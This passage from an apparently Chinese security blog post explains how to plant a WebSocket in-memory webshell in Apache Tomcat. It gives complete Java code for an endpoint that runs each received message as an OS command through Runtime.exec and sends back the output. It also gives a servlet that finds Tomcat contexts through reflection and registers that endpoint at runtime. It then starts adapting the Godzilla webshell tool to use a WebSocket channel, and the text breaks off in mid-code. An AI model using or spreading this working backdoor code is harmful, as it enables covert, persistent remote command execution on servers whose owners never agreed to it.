<p><code>sec</code>：通过注解或显式注册的 WebSocket 配置对象 <code>ServerEndpointConfig </code>fromAnnotatedPojo<code>：是否来自注解 </code>@ServerEndpoint&#96;（true）或是通过程序方式添加（false）</p>
</blockquote>
<p>这个方法虽然不能直接调用，但是我们可以调用它的重载<code>addEndPoint(ServerEndpointConfig sec)</code>，这样的话其实我们只需要传入一个参数即可。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613131319357.png"></p>
<p>这样看来我们就需要构造<code>ServerEndpointConfig</code>实例，并且还需要获取当前Tomcat服务器中的<code>WsServerContainer</code>。以便于去调用其<code>addEndPoint</code>方法来让<code>endpointsRegistered</code>属性变为true。</p>
<h4 id="构造ServerEndpointConfig实例"><a href="#构造ServerEndpointConfig实例" class="headerlink" title="构造ServerEndpointConfig实例"></a>构造ServerEndpointConfig实例</h4><p><code>ServerEndpointConfig</code>是一个接口，可以注意到这个接口的build方法中，会new一个<code>DefaultServerEndpointConfig</code>实例出来，而<code>DefaultServerEndpointConfig</code>刚好是<code>ServerEndpointConfig</code>接口的实现。<code>Builder</code> 是 <code>ServerEndpointConfig</code> 的一个静态内部类。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612153115263.png"></p>
<h4 id="获取WsServerContainer"><a href="#获取WsServerContainer" class="headerlink" title="获取WsServerContainer"></a>获取WsServerContainer</h4><p>WsServerContainer是在WsSci#init中创建的。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612164119246.png"></p>
<p>创建后的WsServerContainer会设置到ApplicationContext中的attributes中，是一个键值对，键名是<code>javax.websocket.server.ServerContainer</code>，当然在tomcat10中就需要将javax修改为jakarta，因为从 Tomcat 10 开始，Java Servlet API 的包名改为了 jakarta.servlet。值就是我们需要的WsServerContainer，也就是当前应用中的WebSocket容器了。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250612164354423.png"></p>
<h2 id="编写内存马"><a href="#编写内存马" class="headerlink" title="编写内存马"></a>编写内存马</h2><p>先来一段WebSocket shell：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cmdWebSocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Session session;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.session = session;  </span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (  </span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));  </span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">errReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getErrorStream()))  </span><br><span class="line">            ) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">while</span> ((line = errReader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            session.getBasicRemote().sendText(output.toString());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                session.getBasicRemote().sendText(<span class="string">&quot;Error: &quot;</span> + e.getMessage());  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;  </span><br><span class="line">                ex.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613122310834.png"></p>
<p>接着要有一个注入点，我这里有用Servlet代替了，主要是能执行一段能够注入上方WebSocket Shell的代码就行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cmisl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.List;  </span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.websocket.server.WsServerContainer;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(name = &quot;cmdShellServlet&quot;, urlPatterns = &#123;&quot;/cmd&quot;&#125;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cmdShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            List&lt;Object&gt; contexts = getContext();  </span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">for</span> (Object context : contexts) &#123;  </span><br><span class="line">                servletContext = (ServletContext) invokeMethod(context, <span class="string">&quot;getServletContext&quot;</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">applicationContext</span> <span class="operator">=</span> getFV(servletContext, <span class="string">&quot;context&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">attributes</span> <span class="operator">=</span> getFV(applicationContext, <span class="string">&quot;attributes&quot;</span>);  </span><br><span class="line">            WsServerContainer wsServerContainer= (WsServerContainer) ((ConcurrentHashMap) attributes).get(<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">            ServerEndpointConfig.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(cmdWebSocket.class, <span class="string">&quot;/ws/cmd&quot;</span>);  </span><br><span class="line">            <span class="type">ServerEndpointConfig</span> <span class="variable">build</span> <span class="operator">=</span> builder.build();  </span><br><span class="line">  </span><br><span class="line">            wsServerContainer.addEndpoint(build);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;  </span><br><span class="line">        doGet(request, response);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getContext</span><span class="params">()</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;  </span><br><span class="line">        List&lt;Object&gt; contexts = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();  </span><br><span class="line">        Thread[] threads = (Thread[]) invokeMethod(Thread.class, <span class="string">&quot;getThreads&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">for</span> (Thread thread : threads) &#123;  </span><br><span class="line">                <span class="comment">// 适配 v5/v6/7/8                </span></span><br><span class="line">                <span class="keyword">if</span> (thread.getName().contains(<span class="string">&quot;ContainerBackgroundProcessor&quot;</span>) &amp;&amp; context == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="type">HashMap</span> <span class="variable">childrenMap</span> <span class="operator">=</span> (HashMap) getFV(getFV(getFV(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;this$0&quot;</span>), <span class="string">&quot;children&quot;</span>);  </span><br><span class="line">                    <span class="keyword">for</span> (Object key : childrenMap.keySet()) &#123;  </span><br><span class="line">                        <span class="type">HashMap</span> <span class="variable">children</span> <span class="operator">=</span> (HashMap) getFV(childrenMap.get(key), <span class="string">&quot;children&quot;</span>);  </span><br><span class="line">                        <span class="keyword">for</span> (Object key1 : children.keySet()) &#123;  </span><br><span class="line">                            context = children.get(key1);  </span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>))  </span><br><span class="line">                                contexts.add(context);  </span><br><span class="line">                            <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>))  </span><br><span class="line">                                contexts.add(context);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="comment">// 适配 tomcat v9                </span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (thread.getContextClassLoader() != <span class="literal">null</span> &amp;&amp; (thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;ParallelWebappClassLoader&quot;</span>) || thread.getContextClassLoader().getClass().toString().contains(<span class="string">&quot;TomcatEmbeddedWebappClassLoader&quot;</span>))) &#123;  </span><br><span class="line">                    context = getFV(getFV(thread.getContextClassLoader(), <span class="string">&quot;resources&quot;</span>), <span class="string">&quot;context&quot;</span>);  </span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;StandardContext&quot;</span>))  </span><br><span class="line">                        contexts.add(context);  </span><br><span class="line">                    <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; context.getClass().getName().contains(<span class="string">&quot;TomcatEmbeddedContext&quot;</span>))  </span><br><span class="line">                        contexts.add(context);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> contexts;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">getFV</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getF(obj, fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">return</span> field.get(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> Field <span class="title function_">getF</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException &#123;  </span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();  </span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);  </span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                <span class="keyword">return</span> field;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;  </span><br><span class="line">                clazz = clazz.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchFieldException</span>(fieldName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">invokeMethod</span><span class="params">(Object targetObject, String methodName)</span> <span class="keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException &#123;  </span><br><span class="line">        <span class="keyword">return</span> invokeMethod(targetObject, methodName, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">invokeMethod</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String methodName, Class[] paramClazz, Object[] param)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> (obj <span class="keyword">instanceof</span> Class) ? (Class) obj : obj.getClass();  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tempClass</span> <span class="operator">=</span> clazz;  </span><br><span class="line">        <span class="keyword">while</span> (method == <span class="literal">null</span> &amp;&amp; tempClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">if</span> (paramClazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    <span class="comment">// Get all declared methods of the class  </span></span><br><span class="line">                    Method[] methods = tempClass.getDeclaredMethods();  </span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (methods[i].getName().equals(methodName) &amp;&amp; methods[i].getParameterTypes().length == <span class="number">0</span>) &#123;  </span><br><span class="line">                            method = methods[i];  </span><br><span class="line">                            <span class="keyword">break</span>;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                    method = tempClass.getDeclaredMethod(methodName, paramClazz);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;  </span><br><span class="line">                tempClass = tempClass.getSuperclass();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);  </span><br><span class="line">        &#125;  </span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="literal">null</span>, param);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e.getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> method.invoke(obj, param);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e.getMessage());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;cmd触发这个Servlet中的代码，然后连接WebSocket发送命令，没问题。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613132115935.png"></p>
<h2 id="工具二开"><a href="#工具二开" class="headerlink" title="工具二开"></a>工具二开</h2><p>由于最近接触哥斯拉和jmg较多，打算把WebSocket整合进去，这里思考了一下还是先把哥斯拉的弄出来。jmg的话比较简单，可以自行思考完成。</p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>哥斯拉的二开可以参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O07OStS2v8XrMCdi6ROGLQ">[二开]_哥斯拉-PHP流量特征修改</a></p>
<p>想要在加密器选项里面有我们新增类型的加密器，需要在jar包里新增一个类，有这个class文件就行，里面有没有内容无所谓。可以使用Jar_Editor插件。然后再从我们src目录下用CryptionAnnotation注解编写这个加密器。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613151926262.png"></p>
<p>哥斯拉的一个逻辑我有简单写过，但是我正在写这篇的时候还没发，如果到时候忘记贴链接了可以在博客里面找找。</p>
<p>哥斯拉的shell初始化逻辑是，直接发送一个很大的马。让服务器上的webshell把大马吃到并加载到内存中。然后会有自己构造的一个通信方式与这个大马交流，这个构造在哥斯拉分析文章也抽离出来了，感兴趣可以看看。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250613155506421.png"></p>
<h4 id="WebSocket通信类"><a href="#WebSocket通信类" class="headerlink" title="WebSocket通信类"></a>WebSocket通信类</h4><p>这个大马其实无需改造，我们小马用hashmap来存储加载的大马和传输的指令即可。至于通信方式手搓了一个：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span 